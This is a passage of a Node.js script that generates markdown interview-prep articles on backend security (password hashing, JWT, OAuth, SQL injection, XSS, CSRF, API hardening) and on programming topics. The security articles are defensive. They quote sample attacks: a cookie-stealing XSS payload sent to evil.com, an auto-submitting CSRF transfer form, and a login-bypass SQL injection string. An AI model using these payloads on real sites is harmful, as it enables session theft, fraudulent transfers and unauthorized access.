    description: 'Why plain text or MD5/SHA256 fail, cryptographic salting, work factors, bcrypt, argon2id, and PBKDF2.',
    content: `---
title: "How Do You Securely Store Passwords?"
category: "Security & Auth"
description: "Why plain text or MD5/SHA256 fail, cryptographic salting, work factors, bcrypt, argon2id, and PBKDF2."
---

# Secure Password Storage & Hashing

Passwords must **never** be stored in plain text or hashed with fast cryptographic algorithms (like MD5, SHA-1, or SHA-256). Modern GPUs can compute over 100 billion SHA-256 hashes per second, making brute-force cracking trivial.

---

## 1. The Core Password Security Formula

$$\\text{Stored Hash} = \\text{SlowKDF}(\\text{Password} + \\text{Unique Salt}, \\text{Work Factor / Memory Cost})$$

1. **Cryptographic Salt:** A cryptographically random string (e.g. 16+ bytes) generated per user. Prevents **Rainbow Table attacks** and ensures two users with identical passwords have completely different hashes.
2. **Work Factor (Cost):** Configurable computational and memory cost designed to make automated cracking computationally infeasible.

---

## 2. Algorithm Recommendations (OWASP Standards)

| Algorithm | Recommended Parameters | Security Characteristics |
| :--- | :--- | :--- |
| **Argon2id (Gold Standard)** | $m=64\\text{MB}, t=3, p=4$ | Winner of Password Hashing Competition. Resistant to both GPU and custom ASIC attacks via memory-hard design. |
| **bcrypt** | Cost factor $\\ge 12$ | Proven industry standard for over 20 years. Built-in salt generation. |
| **PBKDF2-HMAC-SHA256** | $\\ge 600,000$ iterations | FIPS-compliant standard required by government/enterprise compliance. |

\`\`\`typescript
import bcrypt from 'bcrypt';

// Password Hashing
const SALT_ROUNDS = 12;
export async function hashPassword(plainPassword: string): Promise<string> {
  return await bcrypt.hash(plainPassword, SALT_ROUNDS);
}

// Password Verification
export async function verifyPassword(plainPassword: string, storedHash: string): Promise<boolean> {
  return await bcrypt.compare(plainPassword, storedHash);
}
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'hashing-vs-encryption',
    title: 'What is Hashing? How is it Different from Encryption?',
    category: 'Security & Auth',
    description: 'One-way deterministic mathematical transformation vs two-way reversible cryptographic cipher with keys.',
    content: `---
title: "What is Hashing? How is it Different from Encryption?"
category: "Security & Auth"
description: "One-way deterministic mathematical transformation vs two-way reversible cryptographic cipher with keys."
---

# Hashing vs. Encryption

While both are core cryptographic primitives, **Hashing** is a one-way mathematical function that compresses arbitrary data into a fixed-length string, whereas **Encryption** is a two-way function designed to secure data confidentiality so that it can later be decrypted with a key.

---

## Comparison Matrix

| Property | Hashing | Encryption |
| :--- | :--- | :--- |
| **Direction** | **One-way** (irreversible by design) | **Two-way** (reversible with the correct key) |
| **Input / Output** | Variable length input $\\rightarrow$ Fixed length output | Variable length input $\\rightarrow$ Variable length ciphertext |
| **Keys Required** | No keys (except HMAC) | Requires Symmetric (AES) or Asymmetric (RSA/ECC) keys |
| **Primary Goal** | Data integrity verification, password verification | Data confidentiality in transit and at rest |
| **Common Algorithms**| SHA-256, SHA-3, bcrypt, Argon2id, MD5 (broken) | AES-256-GCM, ChaCha20, RSA-4096, ECC |
| **Primary Use Cases** | Password storage, Git commits, file checksums, digital signatures | HTTPS traffic (TLS), credit card storage, end-to-end messaging |

---

## Code Comparison

\`\`\`typescript
import crypto from 'crypto';

// 1. Hashing Example (One-way)
const hash = crypto.createHash('sha256').update('secretData').digest('hex');
// Output: "2bb80e77... (cannot recover 'secretData' from hash)"

// 2. Encryption Example (Two-way reversible with key)
const key = crypto.randomBytes(32);
const iv = crypto.randomBytes(16);
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

let encrypted = cipher.update('sensitiveCreditCard', 'utf8', 'hex');
encrypted += cipher.final('hex');
// 'sensitiveCreditCard' can be fully decrypted using 'key' and 'iv'.
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'jwt-vs-session-authentication',
    title: 'What is JWT? JWT vs. Session-Based Authentication',
    category: 'Security & Auth',
    description: 'Stateless JWT tokens vs stateful server sessions, revocation strategies, security vulnerabilities, and token storage.',
    content: `---
title: "What is JWT? JWT vs. Session-Based Authentication"
category: "Security & Auth"
description: "Stateless JWT tokens vs stateful server sessions, revocation strategies, security vulnerabilities, and token storage."
---

# JWT vs. Session-Based Authentication

Authentication architectures typically choose between **Stateful Server Sessions** and **Stateless JSON Web Tokens (JWT)**.

---

## 1. What is a JWT?

A JSON Web Token consists of three base64url-encoded parts separated by dots: \`header.payload.signature\`

\`\`\`
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
   [ Header: Alg ]  .          [ Payload: Claims ]          .            [ Signature ]
\`\`\`

---

## 2. Architecture Comparison

| Dimension | Stateful Sessions | Stateless JWT |
| :--- | :--- | :--- |
| **State Location** | Stored in Redis / Database on server | Stored inside token on client; verified via cryptographic signature |
| **Scalability** | Requires central session store (Redis) across server instances | Highly scalable; any backend instance can verify without DB lookup |
| **Revocation / Logout** | Instantaneous (\`DEL session:123\`) | Difficult (tokens remain valid until expiration unless blacklisted in Redis) |
| **Payload Size** | Tiny cookie (32-byte UUID) | Large header + claims (500-1500 bytes sent on every HTTP request) |
| **Best For** | Traditional web apps, monoliths, strict instant revocation needs | Distributed microservices, mobile apps, cross-domain SSO |

---

## 3. The Recommended Dual-Token Strategy

To combine the scalability of JWTs with the revocation control of sessions:
1. **Access Token (JWT):** Short-lived (e.g. 10-15 minutes). Sent in \`Authorization: Bearer <token>\`.
2. **Refresh Token (Opaque UUID):** Long-lived (e.g. 7-30 days). Stored securely in database and transmitted only via \`HttpOnly, Secure, SameSite=Strict\` cookie to exchange for new access tokens.
`
  },
  {
    section: 'backend',
    slug: 'oauth-2-fundamentals',
    title: 'What is OAuth 2.0 and How Does It Work?',
    category: 'Security & Auth',
    description: 'Roles, Authorization Code Grant with PKCE, Client Credentials, scopes, and token exchange flows.',
    content: `---
title: "What is OAuth 2.0 and How Does It Work?"
category: "Security & Auth"
description: "Roles, Authorization Code Grant with PKCE, Client Credentials, scopes, and token exchange flows."
---

# OAuth 2.0 Fundamentals

**OAuth 2.0** is an industry-standard authorization framework that enables third-party applications to obtain limited access to an HTTP service on behalf of a resource owner without sharing the user's password.

---

## 1. Core OAuth 2.0 Roles

1. **Resource Owner:** The user who owns the data (e.g. Alice).
2. **Client:** The application requesting access (e.g. Spotify app).
3. **Authorization Server:** Authenticates the user and issues tokens (e.g. Google / GitHub Auth).
4. **Resource Server:** Hosts the protected user resources (e.g. Google Drive API).

---

## 2. Authorization Code Grant Flow with PKCE (Proof Key for Code Exchange)

\`\`\`
User Browser                Client App (SPA/Mobile)         Auth Server              Resource Server
     │                                │                          │                          │
     ├── 1. Click "Login with Google"─►                          │                          │
     │                                ├── 2. Redirect with code_challenge ────────►         │
     │◄── 3. Google Login & Consent Screen ──────────────────────┤                          │
     ├── 4. User Approves ───────────────────────────────────────►                          │
     │◄── 5. Redirect to App with ?code=XYZ ─────────────────────┤                          │
     │                                │                          │                          │
     │                                ├── 6. Exchange code + code_verifier ──────►          │
     │                                │◄── 7. Returns Access Token & ID Token ───┤          │
     │                                │                                                     │
     │                                ├── 8. GET /api/profile (Bearer <AccessToken>) ──────►│
     │                                │◄── 9. Returns User Profile ─────────────────────────┤
\`\`\`

---

## 3. Primary Grant Types

- **Authorization Code + PKCE:** Recommended for all modern Single Page Applications (React, Vue) and mobile apps.
- **Client Credentials:** For server-to-server daemon communication without human user context.
- **Refresh Token Grant:** Used to renew expired access tokens silently.
`
  },
  {
    section: 'backend',
    slug: 'preventing-sql-injection',
    title: 'How Do You Prevent SQL Injection (SQLi)?',
    category: 'Security & Auth',
    description: 'Mechanics of SQL injection vulnerabilities, parameterized queries, prepared statements, and ORMs.',
    content: `---
title: "How Do You Prevent SQL Injection (SQLi)?"
category: "Security & Auth"
description: "Mechanics of SQL injection vulnerabilities, parameterized queries, prepared statements, and ORMs."
---

# Preventing SQL Injection (SQLi)

**SQL Injection (SQLi)** occurs when untrusted user input is directly concatenated into a SQL statement, altering the query's syntactic structure and allowing attackers to execute arbitrary database commands.

---

## 1. Anatomy of an Attack

\`\`\`typescript
// VULNERABLE CODE: Direct string concatenation
const userInput = "admin' OR '1'='1";
const query = \`SELECT * FROM users WHERE username = '\${userInput}' AND password = '\${password}'\`;

// Executed Query:
// SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'
// Result: Attacker bypasses authentication and logs in as admin!
\`\`\`

---

## 2. The Solution: Parameterized Queries (Prepared Statements)

Parameterized queries separate **code** from **data**. The SQL query structure is compiled and optimized by the database engine *before* user parameters are bound:

\`\`\`typescript
// SECURE CODE: Using parameterized placeholders ($1, $2 or ?)
import { Pool } from 'pg';
const pool = new Pool();

const query = 'SELECT id, email, role FROM users WHERE username = $1 AND password_hash = $2';
const values = [username, hashedPassword];

const result = await pool.query(query, values);
\`\`\`

---

## 3. Production Defense in Depth
1. **Always use Prepared Statements or trusted ORMs (Prisma, Drizzle, TypeORM, Hibernate).**
2. **Enforce Principle of Least Privilege:** Database users used by the web service should only possess \`SELECT\`, \`INSERT\`, \`UPDATE\`, \`DELETE\` permissions—never \`DROP TABLE\` or \`GRANT\`.
3. **Input Validation & Sanitization:** Use schema validators (Zod, Joi) to reject malformed parameters before reaching the database layer.
`
  },
  {
    section: 'backend',
    slug: 'understanding-and-mitigating-xss',
    title: 'What is XSS (Cross-Site Scripting) and How to Prevent It?',
    category: 'Security & Auth',
    description: 'Stored, Reflected, and DOM-based XSS, Content Security Policy (CSP), contextual escaping, and sanitization.',
    content: `---
title: "What is XSS (Cross-Site Scripting) and How to Prevent It?"
category: "Security & Auth"
description: "Stored, Reflected, and DOM-based XSS, Content Security Policy (CSP), contextual escaping, and sanitization."
---

# Understanding and Mitigating XSS

**Cross-Site Scripting (XSS)** is a client-side code injection vulnerability where malicious JavaScript scripts are injected into trusted web applications and executed in the victim's browser session.

---

## 1. The Three Types of XSS

1. **Stored XSS (Persistent):** Malicious input is stored in the database (e.g. in a comment body: \`<script>fetch('http://evil.com/steal?c='+document.cookie)</script>\`) and executed every time any user views that comment.
2. **Reflected XSS (Non-Persistent):** The script is reflected off the web server in an immediate response (e.g. in a search query parameter \`https://example.com/search?q=<script>...\`).
3. **DOM-based XSS:** The vulnerability exists entirely in client-side JavaScript when insecure APIs like \`innerHTML\` or \`eval()\` parse untrusted location hashes without sanitization.

---

## 2. Prevention Strategies

### 1. Context-Aware Output Encoding & React Escaping
Modern UI frameworks like React automatically escape JSX variables (\`<div>{userInput}</div>\`), preventing script execution. Avoid raw HTML sinks like \`dangerouslySetInnerHTML\`.

### 2. HTTP-Only Cookies
Set \`HttpOnly\` flag on sensitive session cookies. JavaScript (\`document.cookie\`) cannot read HTTP-only cookies, nullifying session theft via XSS.

### 3. Content Security Policy (CSP)
Configure HTTP response headers that restrict which scripts can execute:
\`\`\`http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com; object-src 'none';
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'understanding-and-mitigating-csrf',
    title: 'What is CSRF (Cross-Site Request Forgery)?',
    category: 'Security & Auth',
    description: 'Mechanics of CSRF attacks, SameSite cookie attributes (Strict, Lax, None), Anti-CSRF tokens, and Double Submit Cookies.',
    content: `---
title: "What is CSRF (Cross-Site Request Forgery)?"
category: "Security & Auth"
description: "Mechanics of CSRF attacks, SameSite cookie attributes (Strict, Lax, None), Anti-CSRF tokens, and Double Submit Cookies."
---

# Understanding and Mitigating CSRF

**Cross-Site Request Forgery (CSRF)** is an attack that forces an authenticated end user to execute unwanted actions on a web application in which they are currently logged in.

---

## 1. How a CSRF Attack Works

1. Alice logs into her bank (\`https://bank.com\`), which sets an authentication session cookie in her browser.
2. Without logging out, Alice visits a malicious site (\`https://evil.com\`).
3. \`evil.com\` contains an invisible auto-submitting form:
   \`\`\`html
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="toAccount" value="attacker_123" />
     <input type="hidden" name="amount" value="5000" />
   </form>
   <script>document.forms[0].submit();</script>
   \`\`\`
4. Alice's browser automatically attaches her \`bank.com\` session cookies to the request, and the bank processes the unauthorized $5,000 transfer!

---

## 2. Defense Mechanisms

### 1. \`SameSite\` Cookie Attribute (Modern Standard)
- \`SameSite=Strict\`: Cookies are never sent on cross-origin requests.
- \`SameSite=Lax\` (Browser Default): Cookies are withheld on cross-site subrequests (images, forms) but sent when navigating to the origin via top-level link clicks.

### 2. Anti-CSRF Synchronizer Tokens
Server generates a cryptographically random, unpredictable token per session. The client must submit this token in a custom header (\`X-CSRF-Token\`) with state-changing requests (\`POST\`, \`PUT\`, \`DELETE\`).
`
  },
  {
    section: 'backend',
    slug: 'api-security-best-practices',
    title: 'How Do You Secure an API in Production?',
    category: 'Security & Auth',
    description: 'OWASP Top 10 API Security Risks (BOLA, Broken Auth, Mass Assignment, Rate Limiting, Input Validation).',
    content: `---
title: "How Do You Secure an API in Production?"
category: "Security & Auth"
description: "OWASP Top 10 API Security Risks (BOLA, Broken Auth, Mass Assignment, Rate Limiting, Input Validation)."
---

# API Security Best Practices

Securing modern APIs requires a multi-layered defense strategy covering authentication, data validation, rate limiting, and access control.

---

## 1. OWASP Top 10 API Security Essentials

| Risk | Description | Mitigation |
| :--- | :--- | :--- |
| **API1: BOLA (Broken Object Level Auth)** | User accesses another user's record by changing the ID in the URL (\`/api/orders/992\`). | Always verify that the authenticated user owns the requested entity in the database query. |
| **API2: Broken Authentication** | Weak token validation, missing expiration, exposed keys. | Use standard OAuth 2.0 / JWT with short TTL and strong signature algorithms. |
| **API3: Broken Object Property Level Auth** | Mass assignment vulnerability exposes sensitive fields. | Use strict DTO whitelisting (never pass \`req.body\` directly into database update). |
| **API4: Unrestricted Resource Consumption** | Missing rate limits and pagination limits leading to DoS. | Implement Redis Token Bucket rate limiting and enforce maximum \`LIMIT\` bounds on queries. |
| **API5: Broken Function Level Auth** | Non-admin users calling administrative endpoints. | Enforce centralized RBAC middleware guards on all routes. |

---

## 2. Production Security Checklist

1. **Enforce HTTPS / TLS 1.3:** Reject unencrypted HTTP traffic.
2. **Sanitize & Validate All Input:** Use validation libraries (Zod, Joi, class-validator) to validate types, lengths, and regex patterns before processing.
3. **Mask Sensitive Information in Logs:** Never log passwords, credit card numbers, or raw authorization tokens.
4. **Implement CORS Whitelisting:** Allow only verified client domains.
5. **Use Security Headers:** Set \`Helmet\` middleware for \`Strict-Transport-Security\`, \`X-Content-Type-Options: nosniff\`, and \`X-Frame-Options: DENY\`.
`
  },
  {
    section: 'backend',
    slug: 'managing-secrets-and-credentials',
    title: 'How Should Sensitive Information (API Keys, DB Credentials) Be Stored?',
    category: 'Security & Auth',
    description: 'Environment variables, Secret Managers (AWS Secrets Manager, Vault), rotation, and zero-trust storage.',
    content: `---
title: "How Should Sensitive Information (API Keys, DB Credentials) Be Stored?"
category: "Security & Auth"
description: "Environment variables, Secret Managers (AWS Secrets Manager, Vault), rotation, and zero-trust storage."
---

# Managing Secrets and Credentials

Hardcoding secrets (database passwords, private keys, third-party API tokens) in source code repositories is one of the leading causes of enterprise data breaches.

---

## 1. Secret Management Hierarchy

\`\`\`
1. Development:  Local .env files (strictly added to .gitignore)
2. CI/CD:        GitHub Actions Secrets / GitLab CI Variables (Injected at build/deploy)
3. Production:   Dedicated Secrets Manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager)
\`\`\`

---

## 2. Best Practices for Secret Hygiene

1. **Never Commit Secrets to Version Control:** Use pre-commit hooks (like \`git-secrets\` or \`TruffleHog\`) to scan commits automatically.
2. **Inject at Runtime via Environment Variables:** Store configurations outside application code (12-Factor App Principle III).
3. **Automate Secret Rotation:** Use Vault or AWS Secrets Manager to rotate database credentials periodically without downtime.
4. **Least-Privilege API Keys:** Restrict API keys to specific IP ranges and specific capability scopes (e.g. \`read:users\` only).
5. **Encrypt at Rest & in Transit:** Encrypt configuration volumes with KMS keys.
`
  },
  {
    section: 'backend',
    slug: 'oop-principles-explained',
    title: 'Explain OOP Principles: Encapsulation, Abstraction, Inheritance, Polymorphism',
    category: 'Programming & Logic',
    description: 'The 4 pillars of Object-Oriented Programming with practical architecture examples and SOLID principles.',
    content: `---
title: "Explain OOP Principles: Encapsulation, Abstraction, Inheritance, Polymorphism"
category: "Programming & Logic"
description: "The 4 pillars of Object-Oriented Programming with practical architecture examples and SOLID principles."
---

# Object-Oriented Programming (OOP) Principles

Object-Oriented Programming structures software design around data objects rather than functions and logic. The paradigm rests on **4 Fundamental Pillars**.

---

## The 4 Pillars of OOP

### 1. Encapsulation
Bundling data (fields) and the methods that operate on that data into a single unit (class), while restricting direct access to internal components (using \`private\`, \`protected\` modifiers).
\`\`\`typescript
class BankAccount {
  private _balance: number = 0;

  public deposit(amount: number): void {
    if (amount <= 0) throw new Error("Deposit must be positive");
    this._balance += amount;
  }

  public get balance(): number {
    return this._balance;
  }
}
\`\`\`

### 2. Abstraction
Hiding complex implementation details and exposing only essential interfaces to the consumer.
\`\`\`typescript
interface PaymentProcessor {
  processPayment(amount: number): Promise<boolean>;
}
// Consumer interacts with simple processPayment() without knowing underlying Stripe/PayPal SDK mechanics.
\`\`\`

### 3. Inheritance
Mechanism where a child class inherits fields and methods from a parent class, promoting code reuse.
\`\`\`typescript
class Vehicle {
  constructor(public speed: number) {}
}
class Car extends Vehicle {
  public honk(): void { console.log("Beep!"); }
}
\`\`\`

### 4. Polymorphism
The ability for different classes to be treated as instances of the same superclass or interface while executing their own specific overridden behavior.
\`\`\`typescript
class StripeProcessor implements PaymentProcessor {
  async processPayment(amount: number) { /* Stripe API call */ return true; }
}
class PayPalProcessor implements PaymentProcessor {
  async processPayment(amount: number) { /* PayPal API call */ return true; }
}
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'interface-vs-abstract-class',
    title: 'What is the Difference Between an Interface and an Abstract Class?',
    category: 'Programming & Logic',
    description: 'Contract specifications vs partial class implementations, multiple inheritance, and architectural selection.',
    content: `---
title: "What is the Difference Between an Interface and an Abstract Class?"
category: "Programming & Logic"
description: "Contract specifications vs partial class implementations, multiple inheritance, and architectural selection."
---

# Interface vs. Abstract Class

Both **Interfaces** and **Abstract Classes** enable polymorphism and contract enforcement, but serve different architectural purposes.

---

## Comparison Table

| Feature | Interface | Abstract Class |
| :--- | :--- | :--- |
| **Implementation** | Pure contract (methods have no body/implementation) | Can contain both abstract methods and fully implemented concrete methods |
| **State / Fields** | Cannot hold state/instance fields (only static constants) | Can declare instance variables, constructors, and state |
| **Inheritance Model** | A class can implement **multiple** interfaces | A class can extend **only one** abstract class (single inheritance) |
| **Constructors** | Cannot have constructors | Can have constructors called via \`super()\` |
| **Speed / Overhead** | Zero runtime overhead (in TypeScript/compiled away) | Object inheritance overhead in memory hierarchy |
| **Core Intent** | Defines *"What an object can do"* (Capabilities / Roles) | Defines *"What an object is"* (Identity / Shared Base Behavior) |

---

## Code Example

\`\`\`typescript
// Interface: Defines a capability
interface Loggable {
  log(message: string): void;
}

// Abstract Class: Provides shared base functionality and state
abstract class BaseRepository<T> {
  constructor(protected tableName: string) {}

  // Concrete method shared by all children
  public findById(id: string): T {
    console.log(\`Querying \${this.tableName} for ID \${id}\`);
    return {} as T;
  }

  // Abstract method child must implement
  public abstract validate(entity: T): boolean;
}
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'multithreading-vs-async-programming',
    title: 'What is Multithreading vs. Asynchronous Programming?',
    category: 'Programming & Logic',
    description: 'OS threads, thread pools, event loop (Node.js/libuv), I/O bound vs CPU bound processing.',
    content: `---
title: "What is Multithreading vs. Asynchronous Programming?"
category: "Programming & Logic"
description: "OS threads, thread pools, event loop (Node.js/libuv), I/O bound vs CPU bound processing."
---

# Multithreading vs. Asynchronous Programming

Concurrency can be achieved via multiple OS threads or single-threaded event-driven non-blocking I/O.

---

## 1. Core Architectural Differences

| Feature | Multithreading (Java, Go, C++, Rust) | Asynchronous Programming (Node.js, Python asyncio) |
| :--- | :--- | :--- |
| **Execution Model** | Multiple OS threads executing instructions in parallel across CPU cores. | Single main thread executing non-blocking I/O via an **Event Loop**. |
| **Memory Cost** | High (each OS thread typically allocates 1MB-8MB stack space). | Very low (single thread with lightweight event registrations). |
| **Concurrency Challenges** | Race conditions, deadlocks, mutex locking overhead. | Callback hell (solved by Promises/async-await), event loop blocking. |
| **Best For** | **CPU-Bound Tasks** (video encoding, cryptography, machine learning). | **I/O-Bound Tasks** (REST APIs, microservices, database querying). |

---

## 2. The Node.js Event Loop Architecture

\`\`\`
[ Incoming I/O Request ] ──► [ Event Loop (Single Thread) ]
                                      │
               ┌──────────────────────┴──────────────────────┐
               ▼                                             ▼
       [ Non-blocking I/O ]                          [ Blocking Task ]
       (Handled by OS kernel via                     (Offloaded to libuv
        epoll / kqueue / IOCP)                        Worker Thread Pool)
               │                                             │
               └──────────────────────┬──────────────────────┘
                                      ▼
                      [ Callback / Promise Resolved ]
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'callbacks-promises-async-await',
    title: 'What is a Callback, Promise, and Async/Await?',
    category: 'Programming & Logic',
    description: 'Evolution of asynchronous control flow in JavaScript/Node.js, microtasks vs macrotasks, error handling.',
    content: `---
title: "What is a Callback, Promise, and Async/Await?"
category: "Programming & Logic"
description: "Evolution of asynchronous control flow in JavaScript/Node.js, microtasks vs macrotasks, error handling."
---

# Callbacks, Promises, and Async/Await

Asynchronous programming in JavaScript has evolved across three major paradigms to handle non-blocking operations cleanly.

---

## 1. The Evolution of Asynchronous Patterns

### 1. Callbacks (Legacy)
Passing a function as an argument to execute upon completion. Led to deeply nested, unreadable **Callback Hell**.
\`\`\`javascript
getUser(userId, (err, user) => {
  if (err) return handleError(err);
  getOrders(user.id, (err, orders) => {
    if (err) return handleError(err);
    getOrderDetails(orders[0].id, (err, details) => {
      // Callback Hell / Pyramid of Doom
    });
  });
});
\`\`\`

### 2. Promises (ES6)
An object representing the eventual completion or failure of an asynchronous operation with three states: \`Pending\`, \`Fulfilled\`, \`Rejected\`.
\`\`\`javascript
getUser(userId)
  .then(user => getOrders(user.id))
  .then(orders => getOrderDetails(orders[0].id))
  .catch(err => handleError(err));
\`\`\`

### 3. Async/Await (ES2017 - Modern Standard)
Syntactic sugar over Promises that allows asynchronous code to be written and structured synchronously using standard \`try/catch\` blocks.
\`\`\`typescript
async function fetchUserOrderSummary(userId: string): Promise<OrderDetails> {
  try {
    const user = await getUser(userId);
    const orders = await getOrders(user.id);
    const details = await getOrderDetails(orders[0].id);
    return details;
  } catch (error) {
    throw new AppError(500, 'Failed to fetch order details', 'ORDER_FETCH_FAILED');
  }
}
\`\`\`
`
  },
  {
    section: 'backend',
    slug: 'backend-project-interview-guide',
    title: 'Project-Based Interview Questions & Architecture Defense',
    category: 'Projects & Practice',
    description: 'Framework for explaining backend architectures, trade-offs, deployment, CI/CD, and post-mortem failure stories.',
    content: `---
title: "Project-Based Interview Questions & Architecture Defense"
category: "Projects & Practice"
description: "Framework for explaining backend architectures, trade-offs, deployment, CI/CD, and post-mortem failure stories."
---

# Project-Based Interview Questions

Interviewers spend 30-50% of senior interviews probing your real-world projects to evaluate architectural judgment, engineering ownership, and troubleshooting abilities.

---

## 1. The STAR Framework for Project Defense

- **Situation:** Context, user scale, business problem, and existing bottlenecks.
- **Task:** Your specific technical responsibility and goals.
- **Action:** Architectural decisions, technologies chosen (with rationale), and trade-offs considered.
- **Result:** Measurable business metrics (e.g. latency reduced from 800ms to 45ms, 99.99% uptime, $40k cloud cost saved).

---

## 2. Common Project Questions & Answer Frameworks

### Question 1: "Explain the architecture of your most recent backend service."
- **How to Answer:** Start top-down: DNS ➔ CDN / Cloudflare ➔ API Gateway ➔ Service Instances (Node.js/Go/Java) ➔ Caching Layer (Redis) ➔ Primary DB (PostgreSQL) ➔ Message Queue (Kafka/RabbitMQ) for asynchronous worker jobs.

### Question 2: "What was the most difficult technical failure you encountered and how did you resolve it?"
- **How to Answer:** Detail a real production incident (e.g., connection pool exhaustion, memory leak, or cascading timeout failure). Explain how you diagnosed it using telemetry/logs, the short-term mitigation (e.g. circuit breaker / scaling), and the long-term architectural fix.

### Question 3: "How did you deploy and test your service?"
- **How to Answer:** Automated CI/CD pipeline (GitHub Actions / GitLab CI), linting, unit + integration tests with Dockerized test databases, containerization via Docker, and zero-downtime rolling deployments on Kubernetes.
`
  }
];

// Ensure content directories exist
const sections = ['backend', 'databases', 'system-design', 'others'];
for (const sec of sections) {
  const dir = path.join(contentDir, sec);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
}

for (const art of articles) {
  const filePath = path.join(contentDir, art.section, `${art.slug}.md`);
  fs.writeFileSync(filePath, art.content.trim() + '\n', 'utf8');
  console.log(`Created: ${art.section}/${art.slug}.md`);
}

console.log('Successfully generated backend articles.');
